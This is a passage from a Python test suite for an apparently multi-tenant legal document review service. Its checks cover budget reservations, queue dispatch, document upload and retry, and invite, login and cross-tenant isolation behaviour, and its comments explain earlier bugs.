    check(_mstatus.get("paused_budget") is True,
          f"**status reports PAUSED_BUDGET**, so a caller that did not keep the create "
          f"response can still learn it ({_mstatus.get('paused_budget')})")
    check(str(_mstatus.get("pause_reason") or "").strip(),
          f"...with the reason the reservation was refused "
          f"({str(_mstatus.get('pause_reason'))[:50]})")
    check("cap" in str(_mstatus.get("pause_reason") or "").lower(),
          "...naming the cap, not merely that something stopped")
    check(isinstance(_mstatus.get("cells_dispatched"), int)
          and _mstatus["cells_dispatched"] > 0,
          f"...and how many cells WERE dispatched ({_mstatus.get('cells_dispatched')})")
    check(isinstance(_mstatus.get("cells_not_dispatched"), int)
          and _mstatus["cells_not_dispatched"] > 0,
          f"...and how many were refused ({_mstatus.get('cells_not_dispatched')})")
    check(_mstatus["cells_dispatched"] + _mstatus["cells_not_dispatched"]
          == _mstatus["cells"],
          f"...and the two account for every cell "
          f"({_mstatus.get('cells_dispatched')} + "
          f"{_mstatus.get('cells_not_dispatched')} = {_mstatus.get('cells')})")
    check(_mstatus.get("table_state") == "PAUSED_BUDGET",
          f"...reported as a STATE, beside complete/cancelled rather than as an error "
          f"({_mstatus.get('table_state')})")

    # A table that did NOT pause says so, so the field is not simply always true.
    _mctx2 = Context(tenant="gate-firm", store=MemoryBackend(), queue=_MQ2(),
                     documents={"d" * 64: {"text": "synthetic"}},  # 028: the caller's own upload
                     clock=lambda: "2026-10-05T00:00:00Z")
    _mfresh = _MBT(store=_MMem(), today=_mdate(2026, 10, 5))
    model_access._ledger = lambda: _mfresh
    try:
        _msmall = _review_table_create(
            {"name": "not paused", "document_ids": ["d" * 64],
             "columns": [{"name": "governing law", "kind": "text",
                          "question": "Which law?"}]},
            _mctx2)
        _mstatus2 = _review_table_status({"grid_id": _msmall.get("grid_id", "")}, _mctx2)
    finally:
        model_access._ledger = _mreal_ledger
    check(_mstatus2.get("paused_budget") is False
          and _mstatus2.get("table_state") != "PAUSED_BUDGET",
          f"a table that did not pause reports false, so the field is measured rather than "
          f"constant ({_mstatus2.get('table_state')})")
    check(_mstatus2.get("cells_not_dispatched") == 0,
          f"...with nothing refused ({_mstatus2.get('cells_not_dispatched')})")

    # ── and this suite leaves the REAL ledger alone ─────────────────────────
    # `_review_table_create` reserves through `_ledger()`, which is a FILE at
    # corpus/.budget.json. The first version of the checks above ran before the seam was
    # patched and leaked 58 reservations worth ₹115.99 against a ₹116.67 daily cap -- which
    # starved an unrelated `conversation.send` test until the day rolled over. Nothing was
    # spent; the cap was simply held by work that would never settle because no worker runs
    # in a test.
    #
    # A1 guarded the same shape for a patched module ("a self-test that leaves the module
    # patched poisons every suite that runs after it"). This is that lesson about a file.
    import json as _mjson
    import pathlib as _mpath
    _mledger_file = _mpath.Path("corpus/.budget.json")
    _mleft = {}
    if _mledger_file.exists():
        try:
            _mleft = {k: v for k, v
                      in (_mjson.loads(_mledger_file.read_text()).get("reservations") or {}
                          ).items() if k.startswith("cell-")}
        except ValueError:
            _mleft = {}
    check(not _mleft,
          f"this suite leaves NO cell reservation in the real ledger -- a test that holds "
          f"the deployment's cap starves every test after it, and the failure surfaces "
          f"somewhere unrelated ({len(_mleft)} left, ₹{sum(_mleft.values()):.2f})")
    # ── move 5: an untyped draft is `unknown`, never a statutory document ───
    # `draft.create {"title": "Board resolution"}` came back `kind: "agm_notice"`, and
    # docs/app-screens/README.md recorded it as "the classifier disagreeing with the obvious
    # reading of the title". There is NO classifier on this path. The line read
    # `args.get("kind") or "agm_notice"` -- a hardcoded default, in five places counting both
    # store backends and the column default in 012.
    #
    # That is worse than a wrong classification, because it is a constant wearing the clothes
    # of a judgement. An AGM notice is a statutory instrument carrying s.96 and s.101
    # obligations; a board resolution is not one, and a draft nobody typed is not either. A
    # title is not a type declaration, so `unknown` is the answer -- the same rule
    # `doc_classifier` already states: "a guess here misfiles a document a lawyer then
    # cannot find".
    _d6_ctx = Context(store=MemoryBackend(), clock=lambda: "2026-10-05T00:00:00Z")
    _d6 = _draft_create({"title": "Board resolution"}, _d6_ctx)
    # Compared against the LITERAL, not against DRAFT_KIND_UNKNOWN. The first draft of this
    # check asserted `kind == DRAFT_KIND_UNKNOWN`, which is true whatever that constant
    # holds -- so setting it back to "agm_notice" kept the suite green. A check that cannot
    # turn red proves nothing, and this file has caught that twice before.
    check(_d6.get("kind") == "unknown" and _d6.get("kind") != "agm_notice",
          f"a draft created with no stated kind is 'unknown', not a statutory document "
          f"type nobody asked for ({_d6.get('kind')!r})")
    _d6_said = _draft_create({"title": "Notice of AGM", "kind": "agm_notice"}, _d6_ctx)
    check(_d6_said.get("kind") == "agm_notice",
          f"...while a kind the CALLER stated is kept exactly as stated "
          f"({_d6_said.get('kind')!r})")
    import inspect as _d6_inspect
    check('"agm_notice"' not in _d6_inspect.getsource(_draft_create)
          and '"agm_notice"' not in _d6_inspect.getsource(_task_args),
          "neither draft path carries a hardcoded statutory kind any more -- the string, "
          "not just its effect, so a second default cannot be added back quietly")

    # ── move 3: a dispatched cell SETTLES its reservation ───────────────────
    # `agents/review_grid.schedule` passes `reservation_id` into every cell's job args and
    # says why: "Carried so the worker settles the exact reservation this cell holds. A
    # settled-by-guess reservation is a leak that only shows up as a budget that never
    # recovers." Nothing consumed it. `reservation_id` appeared NOWHERE in this file, so
    # every cell that ran held its WORST-CASE price until the day rolled over -- a 400-cell
    # table ate a whole day's cap and answered nothing further. Found by running one cell
    # live against local Postgres and reading `corpus/.budget.json` afterwards: ₹2.00
    # outstanding for a cell that had already finished.
    _d5_fresh = _MBT(store=_MMem(), today=_mdate(2026, 10, 5))
    _d5_res = _d5_fresh.reserve(input_tokens=4000, max_tokens=600,
                               reservation_id="cell-settle-check")
    def _d5_held() -> float:
        return sum((_d5_fresh._state().get("reservations") or {}).values())
    _d5_before = _d5_held()
    _d5_store = MemoryBackend()
    _d5_store.write_grid({"grid_id": "grid-settle", "name": "settle",
                          "columns": [{"name": "governing law", "kind": "text",
                                       "question": "Which law?"}],
                          "document_ids": ["b2" * 32]})
    _mreal5 = model_access._ledger
    model_access._ledger = lambda: _d5_fresh
    try:
        _d5_out = _review_grid_cell(
            {"grid_id": "grid-settle", "document_id": "b2" * 32,
             "column": "governing law", "kind": "text", "question": "Which law?",
             "idempotency_key": "grid-settle:b2:governing law",
             "reservation_id": _d5_res.id},
            Context(store=_d5_store, clock=lambda: "2026-10-05T00:00:00Z"))
    finally:
        model_access._ledger = _mreal5
    check(_d5_before > 0.0 and _d5_held() == 0.0,
          f"a cell that FAILED still settles its reservation: the money it did not spend "
          f"goes back to the cap (₹{_d5_before:.2f} held -> ₹{_d5_held():.2f} after, "
          f"cell {_d5_out.get('cell_state')})")
    check(_d5_out.get("reservation_settled") is True,
          f"...and the response SAYS it settled, so a leak is visible in the record rather "
          f"than only in a budget that quietly shrinks "
          f"({_d5_out.get('reservation_settled')})")

    # ── move 3: a PENDING cell says WHY it is pending ───────────────────────
    # "Not dispatched because there is no worker" and "dispatched, waiting its turn" are
    # both PENDING, and the difference is the whole of whether anything will ever happen.
    # A silent PENDING is a table that looks busy and is not.
    _d3_nq = Context(tenant="gate-firm", store=MemoryBackend(), clock=lambda: "2026-10-05T00:00:00Z",
                     documents={"e" * 64: {"text": "synthetic"}})  # 028: own upload
    _d3_fresh = _MBT(store=_MMem(), today=_mdate(2026, 10, 5))
    _mreal2 = model_access._ledger
    model_access._ledger = lambda: _d3_fresh
    try:
        _d3_made = _review_table_create(
            {"name": "no queue", "document_ids": ["e" * 64],
             "columns": [{"name": "governing law", "kind": "text",
                          "question": "Which law?"}]},
            _d3_nq)
        _d3_st = _review_table_status({"grid_id": _d3_made.get("grid_id", "")}, _d3_nq)
    finally:
        model_access._ledger = _mreal2

    check(isinstance(_d3_st.get("dispatch"), dict),
          f"status carries a `dispatch` object, so a PENDING cell can say why "
          f"({_d3_st.get('dispatch')})")
    _d3 = _d3_st.get("dispatch") or {}
    check(_d3.get("queue_configured") is False,
          f"...reporting that no queue is configured ({_d3.get('queue_configured')})")
    check("not dispatched" in str(_d3.get("note") or "").lower(),
          f"...and saying 'not dispatched' in words ({str(_d3.get('note'))[:70]})")
    check(_d3.get("never_dispatched") == _d3_st.get("cells"),
          f"...with every cell counted as never dispatched "
          f"({_d3.get('never_dispatched')} of {_d3_st.get('cells')})")

    # With a queue and no worker: dispatched, and nothing has claimed them.
    _d3_q = _MQ2()
    _d3_wq = Context(tenant="gate-firm", store=MemoryBackend(), queue=_d3_q,
                     documents={"f" * 64: {"text": "synthetic"}},  # 028: the caller's own upload
                     clock=lambda: "2026-10-05T00:00:00Z")
    _d3_fresh2 = _MBT(store=_MMem(), today=_mdate(2026, 10, 5))
    model_access._ledger = lambda: _d3_fresh2
    try:
        _d3_made2 = _review_table_create(
            {"name": "queued, no worker", "document_ids": ["f" * 64],
             "columns": [{"name": "governing law", "kind": "text",
                          "question": "Which law?"}]},
            _d3_wq)
        _d3_st2 = _review_table_status({"grid_id": _d3_made2.get("grid_id", "")}, _d3_wq)
    finally:
        model_access._ledger = _mreal2
    _d3b = _d3_st2.get("dispatch") or {}
    check(_d3b.get("queue_configured") is True,
          f"with a queue, status says so ({_d3b.get('queue_configured')})")
    check(_d3b.get("awaiting_worker") == _d3_st2.get("cells"),
          f"...and counts the cells no worker has claimed "
          f"({_d3b.get('awaiting_worker')} of {_d3_st2.get('cells')})")
    check("no worker" in str(_d3b.get("note") or "").lower(),
          f"...saying 'no worker' rather than leaving PENDING to be read as progress "
          f"({str(_d3b.get('note'))[:70]})")
    check(_d3b.get("never_dispatched") == 0,
          f"...and nothing is 'never dispatched', because the jobs exist "
          f"({_d3b.get('never_dispatched')})")

    # Once a worker claims one, the note stops saying no worker. The complement, so the
    # message is measured rather than constant.
    _d3_claimed = _d3_q.claim(worker="w1")
    check(_d3_claimed is not None, "a worker claims the queued cell")
    _d3_st3 = _review_table_status({"grid_id": _d3_made2.get("grid_id", "")}, _d3_wq)
    _d3c = _d3_st3.get("dispatch") or {}
    check(_d3c.get("awaiting_worker") == 0 and "no worker" not in
          str(_d3c.get("note") or "").lower(),
          f"...and once claimed, the note no longer says no worker "
          f"({_d3c.get('awaiting_worker')}: {str(_d3c.get('note'))[:50]})")

    # ── move 3: the worker can actually run what upload queues ──────────────
    # `vault.upload` enqueues `vault_ingest`. If that intent is not in QUEUED_INTENTS the
    # worker finds no handler, dead-letters the job as not retryable, and the document sits
    # at PENDING for ever -- having been "queued for ingestion". Move 1's HTTP test passed
    # only because it called the ingest handler directly.
    check("vault_ingest" in QUEUED_INTENTS,
          f"vault_ingest is an intent the WORKER can run, not only one upload can enqueue "
          f"({sorted(QUEUED_INTENTS)})")
    check("vault_ingest" in STORE_WRITING_INTENTS,
          "...and it keeps the store, because an ingested document is the product rather "
          "than a run record")
    import tempfile as _d3tmp

    from gateway.filestore import LocalFileStore as _D3LFS
    with _d3tmp.TemporaryDirectory() as _d3dir:
        _d3_files = _D3LFS(_d3dir)
        _d3_store = MemoryBackend()
        _d3_ctx = Context(tenant="gate-firm", store=_d3_store, queue=_MQ2(), files=_d3_files,
                          clock=lambda: "2026-10-05T00:00:00Z")
        _d3_up = _vault_upload({"name": "nda.txt",
                                "text": "This Agreement is governed by the laws of India."},
                               _d3_ctx)
        check(_d3_up.get("status") != "REFUSED",
              f"an upload with a file store is accepted ({str(_d3_up)[:60]})")
        _d3_handlers = queue_handlers(_d3_ctx)
        check("vault_ingest" in _d3_handlers,
              f"queue_handlers offers a vault_ingest handler ({sorted(_d3_handlers)})")
        from gateway.worker import run_one as _d3_run
        _d3_out = _d3_run(queue=_d3_ctx.queue, store=_d3_store, handlers=_d3_handlers)
        check(_d3_out is not None and _d3_out.status != "FAILED",
              f"...and the worker runs it to a named state rather than dead-lettering it "
              f"({_d3_out.status if _d3_out else None}: "
              f"{str(_d3_out.error)[:60] if _d3_out else ''})")
        _d3_row = _d3_store.read_vault_document(_d3_up["document_id"])
        check((_d3_row or {}).get("state") == "INGESTED",
              f"...and the document reaches INGESTED through the WORKER "
              f"({(_d3_row or {}).get('state')})")
        # The same bytes again: the document already held, not a refusal the composer
        # can only show as "Upload interrupted".
        _d3_again = _vault_upload({"name": "nda (copy).txt",
                                   "text": "This Agreement is governed by the laws of India."},
                                  _d3_ctx)
        check(_d3_again.get("document_id") == _d3_up["document_id"]
              and _d3_again.get("duplicate") is True,
              f"re-uploading held bytes returns the existing document ({str(_d3_again)[:80]})")
        check(_d3_again.get("state") == "INGESTED" and _d3_again.get("job_id") is None,
              f"...with its real state and no second ingest job "
              f"({_d3_again.get('state')}, {_d3_again.get('job_id')})")

    # ── move 3: a queued job must point at a run that EXISTS ────────────────
    # `jobs.run_id` references `runs(run_id)`. `_runs_submit` writes the run row first and
    # its comment says why: "a job pointing at a run that does not exist is a foreign-key
    # error on Postgres". Neither `vault.upload` nor `review_table.create` did -- so on a
    # real database the enqueue raised ForeignKeyViolation, upload swallowed it into
    # `queued = None` and told the operator "No queue is configured", which was false.
    # Found by following docs/guides/RUN_LOCALLY.md against live Postgres.
    _d4_store = MemoryBackend()
    with _d3tmp.TemporaryDirectory() as _d4dir:
        _d4_ctx = Context(tenant="gate-firm", store=_d4_store, queue=_MQ2(), files=_D3LFS(_d4dir),
                          clock=lambda: "2026-10-05T00:00:00Z")
        _d4_up = _vault_upload({"name": "a.txt", "text": "Governed by the laws of India."},
                               _d4_ctx)
        check(_d4_up.get("job_id"),
              f"a vault upload returns a job id, so something was really queued "
              f"({_d4_up.get('job_id')})")
        check(_d4_store.read_run(_d4_up["document_id"]) is not None,
              f"...and the RUN ROW the job points at exists, or Postgres refuses the "
              f"insert on its foreign key "
              f"({_d4_store.read_run(_d4_up['document_id']) is not None})")
        check("No queue is configured" not in str(_d4_up.get("note") or ""),
              f"...and the note does not say 'no queue' when one answered "
              f"({str(_d4_up.get('note'))[:60]})")

        # ── move 3b: document, run and job are ONE unit ─────────────────────
        # A full queue was caught and reported in a note, leaving a PENDING document no
        # worker would read. Now nothing is registered, and the caller is told to retry.
        # The Postgres transaction is proved by scripts/vault_upload_atomic_integration.py.
        _d4b_store = MemoryBackend()
        _d4b_full = _MQ2(max_pending=1)
        _d4b_ctx = Context(tenant="gate-firm", store=_d4b_store, queue=_d4b_full, files=_D3LFS(_d4dir),
                           clock=lambda: "2026-10-27T00:00:00Z")
        _vault_upload({"name": "first.txt", "text": "Clause 1. Governed by Indian law."},
                      _d4b_ctx)
        _d4b_busy = _vault_upload({"name": "second.txt",
                                   "text": "Clause 2. Courts at Mumbai."}, _d4b_ctx)
        _d4b_names = [r.get("name") for r in _d4b_store.vault_docs.values()]
        check(_d4b_busy.get("code") == "BUSY" and "second.txt" not in _d4b_names,
              f"a full queue refuses BUSY and registers no document "
              f"({_d4b_busy.get('code')}, {_d4b_names})")

        class _D4bBroken(_MQ2):
            def enqueue(self, **kw):
                raise RuntimeError("queue unreachable")
        _d4b_store2 = MemoryBackend()
        _d4b_broken = _vault_upload({"name": "x.txt", "text": "Clause 3. Notice period."},
                                    Context(tenant="gate-firm", store=_d4b_store2, queue=_D4bBroken(),
                                            files=_D3LFS(_d4dir),
                                            clock=lambda: "2026-10-27T00:00:00Z"))
        check(_d4b_broken.get("code") == "STORAGE_UNAVAILABLE"
              and not _d4b_store2.vault_docs and not _d4b_store2.runs,
              f"a failing enqueue leaves no document and no run behind "
              f"({_d4b_broken.get('code')}, docs={len(_d4b_store2.vault_docs)}, "
              f"runs={len(_d4b_store2.runs)})")

    # ── move 3c: retries exhausted -> FAILED, and a retry that cannot run twice ─
    from gateway.worker import run_one as _d4c_run_one
    with _d3tmp.TemporaryDirectory() as _d4cdir:
        _d4c_store, _d4c_q = MemoryBackend(), _MQ2()
        _d4c_ctx = Context(tenant="gate-firm", store=_d4c_store, queue=_d4c_q, files=_D3LFS(_d4cdir),
                           clock=lambda: "2026-10-27T00:00:00Z")
        _d4c_text = "Clause 5. Notices shall be in writing."
        _d4c_up = _vault_upload({"name": "notice.txt", "text": _d4c_text}, _d4c_ctx)
        _d4c_id = _d4c_up["document_id"]
        # No handler is the non-retryable path: DEAD on the first attempt.
        _d4c_run_one(queue=_d4c_q, store=_d4c_store, handlers={})
        _d4c_row = _d4c_store.read_vault_document(_d4c_id)
        check(_d4c_row["state"] == "FAILED" and _d4c_row.get("failure_reason"),
              f"a document whose ingest job goes DEAD is FAILED, with the reason "
              f"({_d4c_row['state']}, {str(_d4c_row.get('failure_reason'))[:50]})")
        check(_d4c_store.vault_counts()["unsearchable"] == 1,
              "...and counted as unsearchable, never as searchable")
        _d4c_r1 = _vault_retry({"document_id": _d4c_id}, _d4c_ctx)
        _d4c_job = _d4c_q.get(_d4c_id)
        check(_d4c_r1.get("retried") and _d4c_store.read_vault_document(_d4c_id)["state"]
              == "PENDING" and _d4c_job.status == "QUEUED" and _d4c_job.attempts == 0,
              f"vault.retry puts it back to PENDING with its one job requeued "
              f"({_d4c_r1.get('state')}, {_d4c_job.status}, attempts {_d4c_job.attempts})")
        _d4c_r2 = _vault_retry({"document_id": _d4c_id}, _d4c_ctx)
        check(_d4c_r2.get("code") == "CONFLICT" and _d4c_q.get(_d4c_id).status == "QUEUED",
              f"a second retry is refused and changes nothing ({_d4c_r2.get('code')})")
        _d4c_run_one(queue=_d4c_q, store=_d4c_store, handlers={})
        _d4c_again = _vault_upload({"name": "notice (again).txt", "text": _d4c_text},
                                   _d4c_ctx)
        _d4c_jobs = [j for j in _d4c_q.jobs.values() if j["run_id"] == _d4c_id]
        check(_d4c_again.get("retried") and _d4c_again.get("document_id") == _d4c_id
              and len(_d4c_jobs) == 1 and _d4c_jobs[0]["status"] == "QUEUED",
              f"uploading the same bytes again retries the FAILED document, still with ONE "
              f"job ({_d4c_again.get('state')}, jobs={len(_d4c_jobs)})")
        _d4c_ok = _vault_upload({"name": "fine.txt", "text": "Clause 6. Fine."}, _d4c_ctx)
        _d4c_r3 = _vault_retry({"document_id": _d4c_ok["document_id"]}, _d4c_ctx)
        check(_d4c_r3.get("code") == "CONFLICT",
              f"retrying a document that has not failed is refused ({_d4c_r3.get('code')})")

    _d4_fresh = _MBT(store=_MMem(), today=_mdate(2026, 10, 5))
    _d4_gctx = Context(tenant="gate-firm", store=MemoryBackend(), queue=_MQ2(),
                       documents={"a1" * 32: {"text": "synthetic"}},  # 028: the caller's own upload
                       clock=lambda: "2026-10-05T00:00:00Z")
    _mreal3 = model_access._ledger
    model_access._ledger = lambda: _d4_fresh
    try:
        _d4_grid = _review_table_create(
            {"name": "runs exist", "document_ids": ["a1" * 32],
             "columns": [{"name": "governing law", "kind": "text",
                          "question": "Which law?"}]},
            _d4_gctx)
    finally:
        model_access._ledger = _mreal3
    check(len(_d4_grid["scheduled"]["enqueued"]) == 1,
          f"a review table enqueues its cell ({_d4_grid['scheduled']['enqueued']})")
    from agents.review_grid import run_id_for_cell as _d4_rid
    _d4_cell_run = _d4_rid(_d4_grid["grid_id"], "a1" * 32, "governing law")
    check(_d4_gctx.store.read_run(_d4_cell_run) is not None,
          f"...and a RUN ROW exists for that cell, so the job's foreign key holds "
          f"({_d4_gctx.store.read_run(_d4_cell_run) is not None})")

    model_access._ledger = _real_ledger_fn
    check(model_access._ledger is _real_ledger_fn,
          "...and the real ledger function is restored, so a suite running after this one "
          "prices against the deployment's own ledger and not a temporary file")

    # ── 026: sign-in, sessions, invites ──────────────────────────────────────
    import uuid as _uuid_mod

    from gateway.auth import hash_key as _hashk
    from gateway import accounts as _accounts_mod
    from gateway.passwords import hash_password as _hp
    from gateway.roles import LAWYER as _LAWYER, VIEWER as _VIEWER
    from gateway.store import AuthLookup as _AuthLookup

    _acc_mem = _MB()
    _acc_mem.tenant_id = "aaaaaaaa-0000-0000-0000-000000000001"
    _acc_auth = _AuthLookup(memory=_acc_mem)

    def _acc_backend_for(tenant_id, actor_id=None):
        # One MemoryBackend instance cannot hold two tenants at once (SingleTenantOnly
        # lives in app.py, not here) -- this stand-in is deliberately single-tenant, like
        # every other MemoryBackend-based verb test in this file.
        return _acc_mem

    def _acc_ctx(**over):
        base = dict(tenant=_acc_mem.tenant_id, actor="admin-actor", store=_acc_mem,
                    auth=_acc_auth, backend_for=_acc_backend_for,
                    client_ip="203.0.113.5", clock=lambda: "2026-10-10T00:00:00Z")
        base.update(over)
        return Context(**base)

    _pub_ctx = Context(auth=_acc_auth, backend_for=_acc_backend_for, client_ip="203.0.113.5",
                       clock=lambda: "2026-10-10T00:00:00Z")

    # invites.create: the raw token comes back ONCE
    _inv = _V["invites.create"].run({"email": "lawyer@firm.example", "role": _LAWYER},
                                    _acc_ctx())
    check(bool(_inv.get("token")) and bool(_inv.get("invite_id")),
          f"invites.create returns a raw token ONCE ({_inv})")
    check(_V["invites.create"].run({"email": "not-an-email", "role": _LAWYER},
                                   _acc_ctx())["status"] == "REFUSED",
          "invites.create refuses a malformed email")
    check(_V["invites.create"].run({"email": "x@firm.example", "role": "superuser"},
                                   _acc_ctx())["status"] == "REFUSED",
          "...and a role that is not one of the three")
    _inv_token = _inv["token"]

    # 033: an email that already signs in at ANOTHER firm cannot be invited here -- a
    # second sign-in would make auth.login refuse both. The refusal names no firm.
    class _OtherFirmAuth:
        def find_logins(self, email):
            return [{"actor_id": "x", "tenant_id": "bbbbbbbb-0000-0000-0000-000000000002"}]

    _xfirm = _V["invites.create"].run({"email": "victim@othe.example", "role": _VIEWER},
                                      _acc_ctx(auth=_OtherFirmAuth()))
    check(_xfirm.get("code") == "CONFLICT" and "bbbbbbbb" not in str(_xfirm)
          and not _xfirm.get("token"),
          f"invites.create refuses an email that signs in at another firm, naming no firm "
          f"({_xfirm})")

    # invites.accept: PUBLIC shape (no ctx.store up front). Role and email come from the
    # INVITE, never from this request, which supplied neither.
    _accepted = _V["invites.accept"].run(
        {"token": _inv_token, "password": "a-strong-enough-password"}, _pub_ctx)
    check(_accepted.get("status") == "accepted" and _accepted.get("role") == _LAWYER,
          f"invites.accept creates the account with the ROLE FROM THE INVITE ({_accepted})")
    _new_actor = _accepted["actor_id"]
    check(_acc_mem.read_actor(_new_actor)["email"] == "lawyer@firm.example",
          "...and the actor row exists, carrying the invite's email")

    _replay = _V["invites.accept"].run(
        {"token": _inv_token, "password": "another-strong-password"}, _pub_ctx)
    check(_replay.get("code") == "INVALID_INVITE",
          f"the same invite token cannot be accepted twice ({_replay})")
    check(_V["invites.accept"].run({"token": "no-such-token", "password": "whatever-123"},
                                   _pub_ctx).get("code") == "INVALID_INVITE",
          "an unknown token gets the SAME refusal code as an already-used one")

    _inv2 = _V["invites.create"].run({"email": "second@firm.example", "role": _VIEWER},
                                     _acc_ctx())
    _short = _V["invites.accept"].run({"token": _inv2["token"], "password": "short"},
                                      _pub_ctx)
    check(_short.get("code") == "BAD_REQUEST", f"a short password is refused ({_short})")
    check(_acc_auth.find_invite(_hashk(_inv2["token"])).get("accepted_at") is None,
          "...and a REFUSED accept does not spend the invite")

    # ── 036: people.list, invites.list, invites.cancel ──────────────────────
    _plist = _V["invites.list"].run({}, _acc_ctx())
    _pmine = {i["email"]: i for i in _plist.get("invites", [])}
    check("second@firm.example" in _pmine and "lawyer@firm.example" not in _pmine,
          f"invites.list shows the unused invite and not the accepted one ({_plist})")
    check("token" not in str(_plist)
          and _inv2["token"] not in str(_plist)
          and _hashk(_inv2["token"]) not in str(_plist),
          "...and NEVER the raw token or its hash")
    _people = _V["people.list"].run({}, _acc_ctx())
    _pe = {p["email"]: p for p in _people.get("people", [])}
    check(_pe.get("lawyer@firm.example", {}).get("role") == _LAWYER
          and "joined_at" in _pe.get("lawyer@firm.example", {})
          and "password" not in str(_people) and "scrypt$" not in str(_people),
          f"people.list names each person, their role and when they joined, and no "
          f"password hash ({_people})")
    _c_id = _pmine["second@firm.example"]["invite_id"]
    check(_V["invites.cancel"].run({"invite_id": _c_id}, _acc_ctx()).get("status")
          == "cancelled", "invites.cancel withdraws an unused invite")
    check(_c_id in _acc_mem.invites and _acc_mem.invites[_c_id]["cancelled_at"],
          "...and the row is MARKED cancelled, not deleted")
    check("second@firm.example" not in str(_V["invites.list"].run({}, _acc_ctx())),
          "...and it leaves the pending list")
    _c_accept = _V["invites.accept"].run(
        {"token": _inv2["token"], "password": "a-strong-enough-password"}, _pub_ctx)
    _c_unknown = _V["invites.accept"].run(
        {"token": "no-such-token-036", "password": "a-strong-enough-password"}, _pub_ctx)
    check(_c_accept == _c_unknown and _c_accept.get("code") == "INVALID_INVITE",
          f"**accepting a CANCELLED invite fails with the same generic INVALID_INVITE as an "
          f"unknown token** ({_c_accept})")
    check(_V["invites.cancel"].run({"invite_id": _c_id}, _acc_ctx()).get("code")
          == "NOT_FOUND"
          and _V["invites.cancel"].run({}, _acc_ctx()).get("code") == "BAD_REQUEST",
          "cancelling twice is NOT_FOUND, and no id is BAD_REQUEST")

    # Cross-tenant. Firm B is its OWN store, as each tenant gets its own RLS-bound backend
    # in production (proved on Postgres in scripts/rls_integration.py). Firm A's admin
    # passes B's real invite id and gets the same NOT_FOUND as a made-up one.
    _firm_b = _MB()
    _firm_b.tenant_id = "bbbbbbbb-0000-0000-0000-000000000002"
    _firm_b.write_actor({"actor_id": "b-admin", "label": "B admin", "role": "admin",
                         "email": "admin@firm-b.example"})
    _b_inv = _firm_b.create_invite({"invite_id": str(_uuid_mod.uuid4()),
                                    "email": "joiner@firm-b.example", "role": _VIEWER,
                                    "token_hash": "b" * 64, "invited_by": "b-admin",
                                    "expires_at": _future(3600)})
    _x_cancel = _V["invites.cancel"].run({"invite_id": _b_inv["invite_id"]}, _acc_ctx())
    check(_x_cancel.get("code") == "NOT_FOUND"
          and _firm_b.invites[_b_inv["invite_id"]]["cancelled_at"] is None,
          f"firm A's admin CANNOT cancel firm B's invite, even with its real id "
          f"({_x_cancel})")
    check("firm-b" not in str(_V["invites.list"].run({}, _acc_ctx()))
          and "firm-b" not in str(_V["people.list"].run({}, _acc_ctx())),
          "...and firm A's lists show none of firm B's invites or people")
    _b_ctx = _acc_ctx(tenant=_firm_b.tenant_id, actor="b-admin", store=_firm_b)
    check([p["email"] for p in _V["people.list"].run({}, _b_ctx)["people"]]
          == ["admin@firm-b.example"]
          and [i["email"] for i in _V["invites.list"].run({}, _b_ctx)["invites"]]
          == ["joiner@firm-b.example"],
          "...while firm B's admin sees exactly firm B's")

    # auth.login
    _login = _V["auth.login"].run(
        {"email": "lawyer@firm.example", "password": "a-strong-enough-password"}, _pub_ctx)
    check(_login.get("status") == "ok" and bool(_login.get("token"))
          and _login.get("role") == _LAWYER,
          f"auth.login succeeds for the just-accepted account ({_login})")
    _session_token = _login["token"]

    _wrong = _V["auth.login"].run(
        {"email": "lawyer@firm.example", "password": "totally the wrong password"}, _pub_ctx)
    _unknown = _V["auth.login"].run(
        {"email": "nobody-here@firm.example", "password": "anything-at-all-123"}, _pub_ctx)
    check(_wrong == _unknown,
          f"a wrong password and an unknown email return the byte-identical refusal "
          f"({_wrong})")
    check(_wrong["code"] == "INVALID_CREDENTIALS", "...named INVALID_CREDENTIALS")

    _disabled_id = str(_uuid_mod.uuid4())
    _acc_mem.write_actor({"actor_id": _disabled_id, "label": "x", "role": _VIEWER,
                          "email": "disabled@firm.example",
                          "password_hash": _hp("a-strong-enough-password", n=1 << 12, r=8, p=1),
                          "disabled_at": "2026-01-01T00:00:00Z"})
    _disabled_try = _V["auth.login"].run(
        {"email": "disabled@firm.example", "password": "a-strong-enough-password"}, _pub_ctx)
    check(_disabled_try == _wrong,
          f"a DISABLED account's CORRECT password still returns the generic failure "
          f"({_disabled_try})")

    # Ambiguous across tenants (Decision 7): two actors, same email, both with a
    # password. One MemoryBackend instance cannot represent two real tenants at once, so
    # this proves the handler refuses on COUNT alone; the cross-TENANT case is proved
    # against a real Postgres auth_find_login, not here.
    # Written straight into the dict, bypassing write_actor's per-tenant uniqueness
    # check: MemoryBackend represents one tenant at a time, so this is the only way to
    # stand in for two REAL tenants that each independently allow this email once.
    for _aid in (str(_uuid_mod.uuid4()), str(_uuid_mod.uuid4())):
        _acc_mem.actors[_aid] = {
            "actor_id": _aid, "label": "amb", "role": _VIEWER,
            "email": "ambiguous@firm.example",
            "password_hash": _hp("whatever-password-12", n=1 << 12, r=8, p=1),
            "disabled_at": None}
    _amb_try = _V["auth.login"].run(
        {"email": "ambiguous@firm.example", "password": "whatever-password-12"}, _pub_ctx)
    check(_amb_try == _wrong,
          f"an email matching MORE THAN ONE actor refuses generically rather than "
          f"guessing which one ({_amb_try})")

    # session lifecycle: me, logout
    _me = _V["auth.me"].run(
        {}, Context(tenant=_acc_mem.tenant_id, actor=_login["actor_id"], store=_acc_mem))
    check(_me.get("email") == "lawyer@firm.example" and _me.get("role") == _LAWYER,
          f"auth.me reports the caller's own identity, role read live from actors ({_me})")

    _sess_ctx = _acc_ctx(credential_hash=_hashk(_session_token))
    _logout = _V["auth.logout"].run({}, _sess_ctx)
    check(_logout.get("revoked") is True, f"auth.logout revokes the session ({_logout})")
    check(_acc_mem.revoke_session(_hashk(_session_token)) is False,
          "...and the same session cannot be revoked a second time")
    check(_V["auth.logout"].run({}, _acc_ctx())["code"] == "BAD_REQUEST",
          "an API-key-shaped principal (no credential_hash) cannot call auth.logout -- "
          "there is nothing here for it to revoke")

    # lockout
    for _ in range(_accounts_mod.LOGIN_LOCKOUT_MAX):
        _V["auth.login"].run(
            {"email": "lockout-target@firm.example", "password": "wrong-every-time"},
            _pub_ctx)
    _locked = _V["auth.login"].run(
        {"email": "lockout-target@firm.example", "password": "wrong-every-time"}, _pub_ctx)
    check(_locked.get("code") == "LOCKED_OUT",
          f"enough failed attempts lock out the email, end to end through the verb "
          f"({_locked})")
    check(_locked.get("retry_after") == _accounts_mod.LOGIN_LOCKOUT_WINDOW_SECONDS,
